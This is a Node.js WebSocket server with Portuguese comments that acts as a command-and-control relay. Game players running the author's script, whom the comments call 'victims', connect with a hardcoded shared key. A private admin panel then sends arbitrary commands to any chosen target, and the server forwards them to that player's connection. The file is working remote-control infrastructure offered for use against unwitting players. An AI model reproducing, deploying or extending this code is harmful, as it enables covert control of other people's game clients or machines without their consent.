const WebSocket = require('ws');

// O Render define uma porta automática via process.env.PORT, senão usa a 8080 por padrão
const PORT = process.env.PORT || 8080;
const wss = new WebSocket.Server({ port: PORT });

// ⚠️ MUDE ISSO PARA UMA SENHA DIFÍCIL QUE SÓ VOCÊ SABE!
const CHAVE_SECRETA = "BatataFritaComQueijo123";

// Armazena as conexões ativas
let clientesConectados = new Map(); // Guarda socket -> nome do jogador (vítima)
let painelAdmin = null; // Guarda a conexão do seu painel de controle

console.log(`[SERVIDOR] WebSocket rodando com sucesso na porta ${PORT}...`);

wss.on('connection', (ws) => {
    console.log('[CONEXÃO] Novo cliente conectado ao servidor.');

    ws.on('message', (message) => {
        let data;
        try {
            data = JSON.parse(message);
        } catch (e) {
            console.log('[ERRO] Mensagem recebida não é um JSON válido.');
            return;
        }

        // 1. Autenticação das Vítimas (Jogadores rodando seu script)
        if (data.tipo === 'auth') {
            if (data.chave !== CHAVE_SECRETA) {
                console.log('[AUTENTICAÇÃO FALHOU] Chave secreta incorreta de um cliente.');
                ws.close();
                return;
            }
            clientesConectados.set(data.jogador, ws);
            ws.nomeJogador = data.jogador;
            console.log(`[VÍTIMA CONECTADA]: ${data.jogador}`);
        }

        // 2. Autenticação do Seu Painel Admin (O script que só você roda)
        if (data.tipo === 'auth_admin') {
            if (data.chave !== CHAVE_SECRETA) {
                console.log('[AUTENTICAÇÃO FALHOU] Tentativa inválida de login no Admin.');
                ws.close();
                return;
            }
            painelAdmin = ws;
            console.log('[PAINEL ADMIN CONECTADO COM SUCESSO]');
        }

        // 3. O Painel Admin manda um comando para um alvo específico
        if (data.tipo === 'comando' && ws === painelAdmin) {
            let alvoSocket = clientesConectados.get(data.alvo);
            
            if (alvoSocket && alvoSocket.readyState === WebSocket.OPEN) {
                // Repassa o comando exato para o WebSocket da vítima
                alvoSocket.send(JSON.stringify({
                    comando: data.comando
                }));
                console.log(`[COMANDO ENVIADO] Alvo: ${data.alvo} | Ação: ${data.comando}`);
            } else {
                console.log(`[ERRO] Alvo "${data.alvo}" não foi encontrado ou está desconectado.`);
            }
        }
    });

    // Evento quando alguém se desconecta
    ws.on('close', () => {
        if (ws === painelAdmin) {
            painelAdmin = null;
            console.log('[PAINEL ADMIN] Você se desconectou do servidor.');
        } else if (ws.nomeJogador) {
            clientesConectados.delete(ws.nomeJogador);
            console.log(`[VÍTIMA DESCONECTADA]: ${ws.nomeJogador}`);
        }
    });

    // Lida com erros de conexão para o servidor não cair
    ws.on('error', (err) => {
        console.log('[ERRO NO SOCKET]:', err.message);
    });
});